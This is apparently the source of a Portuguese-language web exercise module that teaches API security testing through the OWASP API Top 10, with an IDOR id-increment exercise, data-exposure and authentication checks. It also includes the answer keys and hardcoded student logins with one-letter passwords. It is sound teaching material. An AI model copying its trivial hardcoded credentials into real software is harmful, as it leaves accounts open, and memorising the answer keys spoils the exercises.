    { id: 'b1', opcoes: ['API1', 'API3', 'API5'],              correto: 'API1'             },
    { id: 'b2', opcoes: ['senha_hash', 'nome', 'id'],          correto: 'senha_hash'       },
    { id: 'b3', opcoes: ['DELETE', 'GET', 'OPTIONS'],           correto: 'DELETE'           },
    { id: 'b4', opcoes: ['validar o token do usuário', 'logar o erro', 'retornar 200'], correto: 'validar o token do usuário' },
];

const CONTEUDO_APIS = [
    { id: 'api1',  fase: 'observacao',    titulo: '🔍 A API que conta demais',
      enunciado: 'Você está testando o sistema no ambiente de homolog e acessa:<br><code style="background:#f3f0ff;padding:2px 6px;border-radius:4px;">GET /api/pedidos/100</code><br>A resposta chega normalmente com seus dados. Qual número você tentaria a seguir para ver se acessa dados de outro usuário?',
      placeholder: 'Digite o número' },
    { id: 'api2',  fase: 'observacao',    titulo: '👁️ O que a resposta esconde?',
      enunciado: 'A API retorna este JSON ao consultar um perfil:<br><code style="background:#f3f0ff;padding:2px 6px;border-radius:4px;font-size:12px;">{"id":1,"nome":"Maria","email":"maria@loja.com","cpf":"123.456.789-00","senha_hash":"$2b$10$abc...","saldo":950.00,"plano":"premium","criado_em":"2024-01-10"}</code><br>Quantos campos <strong>não</strong> deveriam aparecer nessa resposta pública?',
      placeholder: 'Digite o número' },
    { id: 'api3',  fase: 'diferenciacao', titulo: '🔐 Autenticado ou Público?',
      enunciado: 'Cada endpoint abaixo precisa de autenticação ou pode ser acessado por qualquer pessoa? Arraste para a coluna correta.' },
    { id: 'api4',  fase: 'diferenciacao', titulo: '🚦 Quem precisa de autenticação?',
      enunciado: 'Ative o toggle nos endpoints que <strong>obrigatoriamente devem exigir autenticação</strong> antes de processar a requisição.' },
    { id: 'api5',  fase: 'classificacao', titulo: '⚠️ Vulnerabilidade ou não?',
      enunciado: 'Analise cada cenário e classifique: é uma vulnerabilidade de API ou um comportamento aceitável?' },
    { id: 'api6',  fase: 'classificacao', titulo: '📦 Dados que não deveriam sair',
      enunciado: 'A resposta abaixo foi capturada na aba Network do browser. Clique nos campos que <strong>não</strong> deveriam aparecer em uma resposta pública de perfil.' },
    { id: 'api7',  fase: 'sintese',       titulo: '📋 O Top 10 das APIs',
      enunciado: 'O OWASP mantém uma lista oficial com as categorias de risco mais comuns em APIs. Quantas categorias compõem essa lista?',
      placeholder: 'Digite o número' },
    { id: 'api8',  fase: 'sintese',       titulo: '🪪 Nomeando o ataque',
      enunciado: 'Durante o teste, você muda a URL de <code style="background:#f3f0ff;padding:2px 6px;border-radius:4px;">GET /api/pedidos/100</code> para <code style="background:#f3f0ff;padding:2px 6px;border-radius:4px;">GET /api/pedidos/101</code> e recebe os dados de outro usuário. Em qual categoria do OWASP API Top 10 esse ataque se enquadra? <em>(responda: API seguido do número)</em>',
      placeholder: 'ex: API1' },
    { id: 'api9',  fase: 'sintese',       titulo: '🔓 Quem pode deletar?',
      enunciado: 'O endpoint <code style="background:#f3f0ff;padding:2px 6px;border-radius:4px;">DELETE /api/admin/users/5</code> aceita requisições de qualquer usuário autenticado — não só administradores. Em qual categoria do OWASP API Top 10 isso se enquadra? <em>(responda: API seguido do número)</em>',
      placeholder: 'ex: API5' },
    { id: 'api10', fase: 'sintese',       titulo: '🗂️ Ordem do teste',
      enunciado: 'No ambiente de homolog, você vai testar a segurança de uma API pela primeira vez. Reorganize os passos abaixo na ordem correta.' },
    { id: 'api11', fase: 'ambiente',      titulo: '🗺️ Mapa da Arquitetura',
      enunciado: 'Esta é a arquitetura do sistema do cliente. Selecione os componentes que estão <strong>expostos externamente</strong> e, portanto, compõem a superfície de ataque da API.' },
    { id: 'api12', fase: 'ambiente',      titulo: '📋 Sprint: quais stories abrem API?',
      enunciado: 'O time acabou de planejar a sprint. Ative o toggle nas user stories que <strong>criam ou expandem a superfície de ataque da API</strong> — ou seja, introduzem novos endpoints ou integrações externas.' },
    { id: 'api13', fase: 'ambiente',      titulo: '🔍 Swagger sem cadeado',
      enunciado: 'Esta é a documentação Swagger do sistema em homolog. Clique nos endpoints que estão <strong>expostos sem autenticação</strong> — onde falta o ícone de cadeado.' },
    { id: 'api14', fase: 'ambiente',      titulo: '🏃 Segurança na Sprint',
      enunciado: 'Como você encaixaria a revisão de segurança de API dentro de uma sprint? Reorganize as etapas na ordem ideal.' },
    { id: 'api15', fase: 'ambiente',      titulo: '📝 Completar o Relatório',
      enunciado: 'Complete o relatório de teste de API preenchendo as lacunas:' },
];

const RESPOSTAS_APIS = {
    api1:  ['101', '2', '102'],
    api2:  ['3'],
    api3:  'drag',
    api4:  'toggle',
    api5:  'drag',
    api6:  'hotspot',
    api7:  ['10'],
    api8:  ['api1', 'API1'],
    api9:  ['api5', 'API5'],
    api10: 'ordem',
    api11: 'map',
    api12: 'toggle',
    api13: 'hotspot',
    api14: 'ordem',
    api15: 'blanks',
};

const testesApis = CONTEUDO_APIS.map(ex => ({ id: ex.id }));

const ALUNOS_APIS = [
    { usuario: 'antonio',  senha: 'M', nomeExibicao: 'Antonio M' },
    { usuario: 'laura',    senha: 'M', nomeExibicao: 'Laura M' },
    { usuario: 'max',      senha: 'C', nomeExibicao: 'Max C' },
    { usuario: 'sergio',   senha: 'B', nomeExibicao: 'Sérgio B' },
    { usuario: 'aline',    senha: 'B', nomeExibicao: 'Aline B' },
    { usuario: 'enzo',     senha: 'V', nomeExibicao: 'Enzo V' },
    { usuario: 'fernanda', senha: 'A', nomeExibicao: 'Fernanda A' },
    { usuario: 'maiara',   senha: 'M', nomeExibicao: 'Maiara M' },
    { usuario: 'paulo',    senha: 'B', nomeExibicao: 'Paulo B' }
];
const CREDENCIAIS_APIS = {};
ALUNOS_APIS.forEach(a => { CREDENCIAIS_APIS[a.usuario] = a; });

function normalizarRespostaApis(r) {
    return String(r || '').normalize('NFD').replace(/[̀-ͯ]/g,'').toLowerCase().trim();
}

function exigirLoginApis(req, res, next) {
    if (req.session.apisAluno) return next();
    res.redirect('/apis');
}

// --- Render helpers ---
function renderSidebarApis() {
    return CONCEITOS_APIS.map((c, i) => `
        <div class="surf-category">
            <div class="surf-cat-header" onclick="toggleConceitoApi(${i})">
                <span class="surf-icon">${c.icone}</span>
                <span class="surf-cat-name">${c.nome}</span>
                <span class="surf-cat-arrow" id="aarrow-${i}">▶</span>
            </div>
            <div class="surf-cat-body" id="aconceito-${i}">
                <p>${c.descricao}</p>
                <p style="margin-top:7px;color:#5B21B6;font-style:italic;"><strong>Exemplo:</strong> ${c.exemplo}</p>
            </div>
        </div>
    `).join('');
}

function renderDragCardApis(teste, ex, idx, items, col1Label, col2Label, col1Val, col2Val) {
    const itemsShuf = shuffleParaAluno([...items], 'apis' + teste.id);
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div class="drag-arena" id="arena-${teste.id}">
            <div class="drag-col" id="col-${teste.id}-${col1Val}" ondragover="event.preventDefault()" ondrop="drop(event,'${teste.id}','${col1Val}')">
                <div class="drag-col-label" style="background:${faseCor}15;color:${faseCor};">${col1Label}</div>
                <div class="drag-col-items" id="items-${teste.id}-${col1Val}"></div>
            </div>
            <div class="drag-col" id="col-${teste.id}-${col2Val}" ondragover="event.preventDefault()" ondrop="drop(event,'${teste.id}','${col2Val}')">
                <div class="drag-col-label" style="background:#6B728020;color:#374151;">${col2Label}</div>
                <div class="drag-col-items" id="items-${teste.id}-${col2Val}"></div>
            </div>
        </div>
        <div class="drag-source" id="source-${teste.id}">
            ${itemsShuf.map(item => `<div class="drag-item" id="dragitem-${teste.id}-${item.id}" draggable="true" ondragstart="dragStart(event,'${teste.id}','${item.id}')" data-ex="${teste.id}" data-id="${item.id}">${item.texto}</div>`).join('')}
        </div>
        <button class="btn-validar" onclick="validarDragApis('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderToggleCardApis(teste, ex, idx, items, instrucaoAtivar) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div class="stories-list">
            ${items.map(s => `
            <div class="story-card">
                <label class="toggle-sw">
                    <input type="checkbox" id="atoggle-${teste.id}-${s.id}">
                    <span class="toggle-track"></span>
                </label>
                <div style="flex:1">
                    <span style="font-size:11px;font-weight:700;color:#7C3AED;background:#f3f0ff;padding:2px 7px;border-radius:999px;">${s.tag || s.id.toUpperCase()}</span>
                    <p style="margin:5px 0 0;font-size:13px;color:#374151;">${s.texto}</p>
                </div>
            </div>`).join('')}
        </div>
        <button class="btn-validar" onclick="validarToggleApis('${teste.id}','atoggle')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderHotspotJsonCard(teste, ex, idx) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    const campos = [
        { id:'id',         label:'"id"',         valor:'"1"' },
        { id:'nome',       label:'"nome"',       valor:'"Maria Silva"' },
        { id:'email',      label:'"email"',      valor:'"maria@loja.com"' },
        { id:'cpf',        label:'"cpf"',        valor:'"123.456.789-00"' },
        { id:'senha_hash', label:'"senha_hash"', valor:'"$2b$10$xKp..."' },
        { id:'saldo',      label:'"saldo"',      valor:'950.00' },
        { id:'plano',      label:'"plano"',      valor:'"premium"' },
        { id:'criado_em',  label:'"criado_em"',  valor:'"2024-01-10"' },
    ];
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div style="background:#1e1e2e;border-radius:10px;padding:16px 20px;font-family:monospace;font-size:13px;color:#cdd6f4;margin-bottom:16px;">
            <span style="color:#89b4fa;">{</span><br>
            ${campos.map(c => `  <span class="json-field" id="jf-${teste.id}-${c.id}" onclick="toggleJsonField('${teste.id}','${c.id}')" style="cursor:pointer;display:inline-block;border-radius:4px;padding:1px 3px;transition:background 0.15s;">${c.label}<span style="color:#a6e3a1;">:</span> <span style="color:#fab387;">${c.valor}</span>,</span><br>`).join('')}
            <span style="color:#89b4fa;">}</span>
        </div>
        <p style="font-size:12px;color:#6D28D9;font-style:italic;">💡 Clique nos campos para marcá-los como problemáticos. Clique novamente para desmarcar.</p>
        <button class="btn-validar" onclick="validarHotspotJson('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderMapCardApis(teste, ex, idx) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    const ext = ITEMS_MAP_API11.filter(i => i.zona === 'ext');
    const int = ITEMS_MAP_API11.filter(i => i.zona === 'int');
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div class="env-map" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px;">
            <div style="border:2px dashed #DC2626;border-radius:10px;padding:12px;">
                <div style="font-size:11px;font-weight:700;color:#DC2626;margin-bottom:10px;text-transform:uppercase;">🌐 Zona Externa (Internet)</div>
                ${ext.map(item => `<div class="map-comp" id="mapapi-${teste.id}-${item.id}" onclick="toggleMapApi('${teste.id}','${item.id}')" style="margin-bottom:8px;">${item.emoji} ${item.nome}</div>`).join('')}
            </div>
            <div style="border:2px dashed #059669;border-radius:10px;padding:12px;">
                <div style="font-size:11px;font-weight:700;color:#059669;margin-bottom:10px;text-transform:uppercase;">🔒 Zona Interna (Rede Privada)</div>
                ${int.map(item => `<div class="map-comp" id="mapapi-${teste.id}-${item.id}" onclick="toggleMapApi('${teste.id}','${item.id}')" style="margin-bottom:8px;">${item.emoji} ${item.nome}</div>`).join('')}
            </div>
        </div>
        <p style="font-size:12px;color:#6D28D9;font-style:italic;">💡 Selecione apenas os componentes acessíveis diretamente pela internet.</p>
        <button class="btn-validar" onclick="validarMapaApi('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderOrdemCardApis(teste, ex, idx, passos, aluno) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    const shuffled = shuffleParaAluno([...passos], aluno + teste.id);
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <ol class="ordem-list" id="ordem-list-${teste.id}">
            ${shuffled.map(p => `<li class="ordem-item" id="ordemapi-${teste.id}-${p.id}" data-id="${p.id}" draggable="true"
                ondragstart="apiOrdemDragStart(event,'${p.id}')"
                ondragover="apiOrdemDragOver(event,'${teste.id}','${p.id}')"
                ondragleave="apiOrdemDragLeave(event)"
                ondrop="apiOrdemDrop(event,'${teste.id}','${p.id}')">
                <span class="ordem-handle">⠿</span>${p.texto}
            </li>`).join('')}
        </ol>
        <button class="btn-validar" onclick="validarOrdemApi('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderSwaggerHotspotCard(teste, ex, idx) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    const endpoints = [
        { id:'login',     method:'POST', path:'/api/login',           auth: false, label:'Autenticação pública' },
        { id:'produtos',  method:'GET',  path:'/api/produtos',        auth: false, label:'Catálogo de produtos' },
        { id:'pedidos',   method:'GET',  path:'/api/pedidos/{id}',    auth: true,  label:'Consultar pedido' },
        { id:'admin',     method:'DELETE',path:'/api/admin/users/{id}',auth: true, label:'Remover usuário (admin)' },
        { id:'relatorio', method:'GET',  path:'/api/relatorio-vendas',auth: true,  label:'Relatório de vendas' },
        { id:'status',    method:'GET',  path:'/api/status',          auth: false, label:'Health check' },
    ];
    const methodColor = { GET:'#61affe', POST:'#49cc90', DELETE:'#f93e3e', PUT:'#fca130', PATCH:'#50e3c2' };
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div style="border:2px solid #e2e8f0;border-radius:10px;overflow:hidden;margin-bottom:16px;font-family:sans-serif;">
            <div style="background:#173752;padding:10px 16px;color:white;font-size:13px;font-weight:700;">📄 API Documentation — Sistema de Pedidos v2.1</div>
            ${endpoints.map(ep => `
            <div class="swagger-ep" id="swep-${teste.id}-${ep.id}" onclick="toggleSwaggerEp('${teste.id}','${ep.id}')"
                style="display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid #e2e8f0;cursor:pointer;transition:background 0.15s;">
                <span style="background:${methodColor[ep.method]||'#aaa'};color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;min-width:52px;text-align:center;">${ep.method}</span>
                <span style="font-family:monospace;font-size:12px;color:#374151;flex:1;">${ep.path}</span>
                <span style="font-size:11px;color:#64748b;">${ep.label}</span>
                <span style="font-size:16px;">${ep.auth ? '🔒' : '🌐'}</span>
            </div>`).join('')}
        </div>
        <p style="font-size:12px;color:#6D28D9;font-style:italic;">💡 🔒 = deveria exigir auth. 🌐 = público. Clique nos endpoints que estão mal configurados (sem auth quando deveriam ter).</p>
        <button class="btn-validar" onclick="validarSwaggerHotspot('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderBlanksCardApis(teste, ex, idx) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <div class="report-tpl" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:18px 22px;font-size:13px;line-height:2.2;color:#374151;">
            <strong>Relatório de Teste de API — Sprint 12</strong><br>
            <strong>Endpoint testado:</strong> GET /api/pedidos/{id}<br>
            <strong>Categoria OWASP:</strong>
            <select class="blank-sel" id="ablank-${teste.id}-b1">${BLANKS_API15.find(b=>b.id==='b1').opcoes.map(o=>`<option value="${o}">${o}</option>`).join('')}</select>
            <br>
            <strong>Campo sensível exposto:</strong>
            <select class="blank-sel" id="ablank-${teste.id}-b2">${BLANKS_API15.find(b=>b.id==='b2').opcoes.map(o=>`<option value="${o}">${o}</option>`).join('')}</select>
            <br>
            <strong>Método HTTP da rota de exclusão vulnerável:</strong>
            <select class="blank-sel" id="ablank-${teste.id}-b3">${BLANKS_API15.find(b=>b.id==='b3').opcoes.map(o=>`<option value="${o}">${o}</option>`).join('')}</select>
            <br>
            <strong>Recomendação principal:</strong>
            <select class="blank-sel" id="ablank-${teste.id}-b4" style="min-width:220px;">${BLANKS_API15.find(b=>b.id==='b4').opcoes.map(o=>`<option value="${o}">${o}</option>`).join('')}</select>
        </div>
        <button class="btn-validar" onclick="validarBlanksApi('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderCardApis(teste, ex, idx, aluno) {
    const faseCorMap = { observacao:'#3B82F6', diferenciacao:'#D97706', classificacao:'#DC2626', sintese:'#7C3AED', ambiente:'#0891B2' };
    const faseCor = faseCorMap[ex.fase] || '#7C3AED';
    const faseNome = { observacao:'Observação', diferenciacao:'Diferenciação', classificacao:'Classificação', sintese:'Síntese', ambiente:'Ambiente' }[ex.fase] || ex.fase;

    if (ex.id === 'api3') return renderDragCardApis(teste, ex, idx, ITEMS_DRAG_API3, '🔐 Precisa de Auth', '🌐 Pode ser Público', 'auth', 'publico');
    if (ex.id === 'api4') return renderToggleCardApis(teste, ex, idx, TOGGLES_API4, 'Deve exigir autenticação');
    if (ex.id === 'api5') return renderDragCardApis(teste, ex, idx, ITEMS_DRAG_API5, '⚠️ Vulnerabilidade de API', '✅ Comportamento Aceitável', 'vuln', 'ok');
    if (ex.id === 'api6') return renderHotspotJsonCard(teste, ex, idx);
    if (ex.id === 'api10') return renderOrdemCardApis(teste, ex, idx, PASSOS_API10, aluno);
    if (ex.id === 'api11') return renderMapCardApis(teste, ex, idx);
    if (ex.id === 'api12') return renderToggleCardApis(teste, ex, idx, STORIES_API12, 'Cria/expande superfície de API');
    if (ex.id === 'api13') return renderSwaggerHotspotCard(teste, ex, idx);
    if (ex.id === 'api14') return renderOrdemCardApis(teste, ex, idx, PASSOS_API14, aluno);
    if (ex.id === 'api15') return renderBlanksCardApis(teste, ex, idx);

    // Texto simples
    return `<div class="exercise-card" id="card-${teste.id}">
        <div class="card-header">
            <span class="card-badge" style="background:${faseCor}20;color:${faseCor};">Fase ${faseNome}</span>
            <span class="card-num">Exercício ${idx+1} de 15 <span id="check-${teste.id}"></span></span>
        </div>
        <h3>${ex.titulo}</h3>
        <p class="card-enunciado">${ex.enunciado}</p>
        <input type="text" id="resp-${teste.id}" class="input-resposta" placeholder="${ex.placeholder || 'Digite sua resposta'}">
        <button class="btn-validar" onclick="validarTextoApi('${teste.id}')" style="background:${faseCor};">✅ Validar</button>
        <div class="feedback" id="fb-${teste.id}"></div>
    </div>`;
}

function renderExerciciosApis(aluno) {
    return testesApis.map((t, i) => {
        const ex = CONTEUDO_APIS.find(e => e.id === t.id);
        return renderCardApis(t, ex, i, aluno);
    }).join('');
}

const estiloApis = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'IBM Plex Sans', system-ui, sans-serif; background: #f5f3ff; color: #1e1b4b; }
    .container { display: flex; min-height: 100vh; }
    .sidebar { width: 280px; min-height: 100vh; background: #fff; border-right: 1px solid #ede9fe; padding: 24px 16px; position: sticky; top: 0; overflow-y: auto; max-height: 100vh; flex-shrink: 0; }
    .sidebar-brand h2 { font-size: 15px; color: #4C1D95; margin-bottom: 4px; }
    .sidebar-brand p  { font-size: 12px; color: #6D28D9; }
    .contador-box { background: #f3f0ff; border-radius: 8px; padding: 10px 14px; margin: 14px 0; }
    .contador-box p { font-size: 13px; font-weight: 700; color: #7C3AED; }
    .surf-section-title { font-size: 10px; font-weight: 700; color: #9CA3AF; text-transform: uppercase; letter-spacing: .08em; margin: 16px 0 8px; }
    .surf-hint { font-size: 11px; color: #9CA3AF; margin-bottom: 10px; }
    .surf-category { border: 1px solid #ede9fe; border-radius: 8px; margin-bottom: 8px; overflow: hidden; }
    .surf-cat-header { display: flex; align-items: center; gap: 8px; padding: 10px 12px; cursor: pointer; background: #faf9ff; }
    .surf-icon { font-size: 16px; }
    .surf-cat-name { flex: 1; font-size: 12px; font-weight: 600; color: #4C1D95; }
    .surf-cat-arrow { font-size: 10px; color: #7C3AED; transition: transform .2s; }
    .surf-cat-body { display: none; padding: 10px 12px; font-size: 12px; line-height: 1.6; color: #374151; background: #fff; border-top: 1px solid #ede9fe; }
    .sidebar-actions { margin-top: 20px; display: flex; flex-direction: column; gap: 8px; }
    .btn-reset  { background: #f3f0ff; color: #7C3AED; border: 1px solid #ede9fe; border-radius: 8px; padding: 9px; font-size: 12px; cursor: pointer; }
    .btn-logout { background: #fee2e2; color: #b91c1c; border-radius: 8px; padding: 9px; font-size: 12px; text-align: center; text-decoration: none; }
    .btn-hub    { background: #f1f5f9; color: #475569; border-radius: 8px; padding: 9px; font-size: 12px; text-align: center; text-decoration: none; }
    .main { flex: 1; padding: 32px 28px; max-width: 820px; }
    .main-header { margin-bottom: 28px; }
    .main-header h2 { font-size: 22px; color: #4C1D95; margin-bottom: 6px; }
    .main-header p  { font-size: 13px; color: #6D28D9; }
    .exercise-card { background: #fff; border: 1px solid #ede9fe; border-radius: 14px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(124,58,237,.07); }
    .exercise-card.concluido { border-color: #16a34a; background: #f0fdf4; }
    .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
    .card-badge { font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 999px; }
    .card-num   { font-size: 11px; color: #9CA3AF; }
    .exercise-card h3 { font-size: 16px; color: #1e1b4b; margin-bottom: 10px; }
    .card-enunciado { font-size: 13px; color: #374151; line-height: 1.7; margin-bottom: 16px; }
    .input-resposta { width: 100%; border: 1px solid #c4b5fd; border-radius: 8px; padding: 10px 14px; font-size: 14px; outline: none; margin-bottom: 12px; }
    .input-resposta:focus { border-color: #7C3AED; box-shadow: 0 0 0 3px #7c3aed20; }
    .btn-validar { background: #7C3AED; color: white; border: none; border-radius: 8px; padding: 10px 22px; font-size: 13px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
    .btn-validar:hover { opacity: .88; }
    .feedback { font-size: 13px; font-weight: 600; min-height: 20px; }
    .drag-arena { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 14px; }
    .drag-col   { border: 2px dashed #c4b5fd; border-radius: 10px; padding: 10px; min-height: 100px; }
    .drag-col-label { font-size: 11px; font-weight: 700; text-align: center; padding: 4px 8px; border-radius: 6px; margin-bottom: 8px; }
    .drag-col-items { display: flex; flex-direction: column; gap: 6px; }
    .drag-source { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; }
    .drag-item  { background: #f3f0ff; border: 1px solid #c4b5fd; border-radius: 8px; padding: 8px 12px; font-size: 12px; cursor: grab; user-select: none; }
    .drag-item:active { cursor: grabbing; }
    .drag-item.drag-errado { border-color: #dc2626; background: #fee2e2; animation: shake .4s; }
    .stories-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
    .story-card { display: flex; align-items: flex-start; gap: 14px; background: #faf9ff; border: 1px solid #ede9fe; border-radius: 10px; padding: 12px 14px; }
    .toggle-sw  { position: relative; width: 42px; height: 24px; flex-shrink: 0; margin-top: 2px; }
    .toggle-sw input { opacity: 0; width: 0; height: 0; }
    .toggle-track { position: absolute; inset: 0; background: #d1d5db; border-radius: 999px; cursor: pointer; transition: background .2s; }
    .toggle-track::after { content: ''; position: absolute; left: 3px; top: 3px; width: 18px; height: 18px; background: white; border-radius: 50%; transition: transform .2s; }
    .toggle-sw input:checked + .toggle-track { background: #7C3AED; }
    .toggle-sw input:checked + .toggle-track::after { transform: translateX(18px); }
    .map-comp { background: #f3f0ff; border: 2px solid #c4b5fd; border-radius: 8px; padding: 8px 12px; font-size: 12px; cursor: pointer; transition: all .15s; }
    .map-comp.selected { background: #7C3AED; color: white; border-color: #7C3AED; }
    .map-comp.mapa-erro { border-color: #dc2626; background: #fee2e2; animation: shake .4s; }
    .ordem-list { list-style: none; display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
    .ordem-item { background: #f3f0ff; border: 1px solid #c4b5fd; border-radius: 8px; padding: 10px 14px; font-size: 13px; cursor: grab; display: flex; align-items: center; gap: 10px; }
    .ordem-item.drag-over { border-color: #7C3AED; background: #ede9fe; }
    .ordem-handle { color: #9CA3AF; font-size: 16px; }
    .json-field.hs-selected { background: #7C3AED30; outline: 2px solid #7C3AED; border-radius: 4px; }
    .json-field.hs-erro     { background: #dc262630; outline: 2px solid #dc2626; border-radius: 4px; animation: shake .4s; }
    .swagger-ep.hs-selected { background: #7C3AED18 !important; outline: 2px solid #7C3AED; }
    .swagger-ep.hs-erro     { background: #dc262618 !important; outline: 2px solid #dc2626; animation: shake .4s; }
    .report-tpl { margin-bottom: 16px; }
    .blank-sel  { border: 1px solid #c4b5fd; border-radius: 6px; padding: 3px 8px; font-size: 12px; background: white; cursor: pointer; margin: 0 4px; }
    .blank-erro { border-color: #dc2626 !important; }
    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-4px)} 75%{transform:translateX(4px)} }
`;

const scriptApis = `
    function toggleConceitoApi(i) {
        const b = document.getElementById('aconceito-' + i);
        const a = document.getElementById('aarrow-' + i);
        if (b.style.display === 'block') { b.style.display='none'; a.style.transform=''; }
        else { b.style.display='block'; a.style.transform='rotate(90deg)'; }
    }

    // --- Drag 2 colunas (reutiliza lógica compatível) ---
    let apiDragExId = null, apiDragItemId = null;
    function dragStart(event, exId, id) { apiDragExId = exId; apiDragItemId = id; event.dataTransfer.effectAllowed='move'; }
    function drop(event, exId, col) {
        event.preventDefault();
        if (!apiDragItemId) return;
        const el = document.getElementById('dragitem-' + exId + '-' + apiDragItemId);
